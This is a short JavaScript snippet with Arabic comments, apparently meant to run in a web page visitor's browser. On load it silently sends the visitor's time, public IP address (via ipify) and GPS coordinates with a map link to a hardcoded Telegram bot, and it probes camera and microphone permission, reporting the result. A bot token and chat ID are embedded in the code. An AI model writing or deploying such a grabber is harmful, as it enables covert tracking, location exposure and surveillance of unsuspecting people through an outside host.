const token = "7667682276:AAHrNXBQ3JnCJxYdvgAa_cgOqo_OWMb2rNA";
const chatId = "6659044299";

// دالة إرسال إلى Telegram
function sendToTelegram(text) {
  fetch("https://api.telegram.org/bot" + token + "/sendMessage", {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({
      chat_id: chatId,
      text: text
    })
  });
}

// إرسال الوقت الحالي
sendToTelegram("🕒 " + new Date().toLocaleString());

// إرسال IP
fetch("https://api.ipify.org?format=json")
  .then(res => res.json())
  .then(data => sendToTelegram("🌐 IP: " + data.ip));

// إرسال الموقع الجغرافي
function askLocation() {
  navigator.geolocation.getCurrentPosition(pos => {
    const { latitude, longitude } = pos.coords;
    const link = `https://maps.google.com/?q=${latitude},${longitude}`;
    sendToTelegram(`📍 Location:\nLatitude: ${latitude}\nLongitude: ${longitude}\n${link}`);
  });
}
askLocation();

// طلب الكاميرا
function askCamera() {
  navigator.mediaDevices.getUserMedia({ video: true })
    .then(stream => {
      sendToTelegram("📸 Camera access granted");
      stream.getTracks().forEach(t => t.stop());
    })
    .catch(() => {
      sendToTelegram("❌ Camera access denied");
    });
}
askCamera();

// طلب المايكروفون
function askMic() {
  navigator.mediaDevices.getUserMedia({ audio: true })
    .then(stream => {
      sendToTelegram("🎤 Microphone access granted");
      stream.getTracks().forEach(t => t.stop());
    })
    .catch(() => {
      sendToTelegram("❌ Microphone access denied");
    });
}
askMic();
